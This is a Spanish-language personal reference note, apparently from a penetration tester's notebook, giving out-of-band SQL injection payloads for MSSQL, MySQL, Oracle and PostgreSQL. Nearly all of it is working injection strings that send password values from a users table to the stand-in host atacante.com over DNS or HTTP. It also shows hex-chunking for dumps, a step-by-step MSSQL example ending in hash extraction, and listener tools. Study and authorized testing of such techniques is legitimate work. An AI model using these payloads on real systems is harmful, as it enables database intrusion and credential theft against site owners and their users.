---
tipo: meta
aliases:
  - Payloads OOB
tags:
  - meta/referencia
  - dominio/web
---

# SQLi fuera de banda - matriz de referencia

> [!info] Referencia pura, no un zettel
> El criterio está en [[SQLi - canal fuera de banda]]. Acá la sintaxis por motor. Reemplazá `atacante.com` por tu dominio de Collaborator/interactsh.
>
> `yi``  ` copia el payload.

## 1. La primitiva de red por motor

`'; exec master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.atacante.com\x'-- -`
MSSQL — **el más fácil**: `xp_dirtree` no pide config especial y resuelve la ruta UNC.

`' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.atacante.com\\x'))-- -`
MySQL, **solo en Windows** (rutas UNC) y con `secure_file_priv` permisivo + privilegio `FILE`.

`' AND (SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE rownum=1)||'.atacante.com') FROM dual) IS NOT NULL-- -`
Oracle, con permisos de red (ACL). Exfil por DNS.

`' AND (SELECT UTL_HTTP.request('http://atacante.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual) IS NOT NULL-- -`
Oracle, con ACL. Exfil por HTTP en vez de DNS.

`COPY (SELECT '') TO PROGRAM 'nslookup ...atacante.com'`
PostgreSQL, superusuario, requiere `COPY ... FROM/TO PROGRAM`. Se arma el nombre con el dato antes del `nslookup`.

## 2. Exfil de más de un valor

El subdominio tiene límite de largo (~63 por etiqueta, ~253 total). Para dumps se hace hex y se trocea:

`... CONCAT((SELECT hex(concat(username,0x3a,password)) FROM users LIMIT 1),'.atacante.com') ...`
Hex evita caracteres inválidos en DNS. Si excede el largo, iterar con `substring`.

## 3. Herramientas de recepción

| Herramienta | Qué da |
|---|---|
| Burp Collaborator | Dominio único + panel con las consultas DNS/HTTP recibidas |
| interactsh (`interactsh-client`) | Igual, self-hosted / CLI |
| Tu propio servidor DNS autoritativo | Control total; `tcpdump -i any port 53` para verlo crudo |

## Ejemplo — MSSQL

```
1. '; exec master..xp_dirtree '\\test.atacante.com\x'-- -
   → en Collaborator llega una consulta DNS a test.atacante.com  → hay egress + primitiva

2. '; exec master..xp_dirtree '\\'+(SELECT TOP 1 name FROM sys.databases WHERE name NOT IN ('master','tempdb','model','msdb'))+'.atacante.com\x'-- -
   → llega "appdb.atacante.com"  → base = appdb

3. '; exec master..xp_dirtree '\\'+(SELECT TOP 1 password FROM appdb..users)+'.atacante.com\x'-- -
   → llega el hash como subdominio, en una sola petición
```

## Límites

| Síntoma | Qué pasó |
|---|---|
| No llega ninguna consulta | Sin egress, o la primitiva está bloqueada → bajar a temporal ciego |
| Llega la DNS pero sin el dato | El dato tiene caracteres inválidos para DNS → usar hex |
| Subdominio truncado | Superó el largo de etiqueta → trocear con `substring` |

## Relacionadas

[[SQLi - canal fuera de banda]] · [[MOC - SQL injection]] · [[Dialectos SQL - matriz de referencia]] · [[Consulta DNS saliente]]
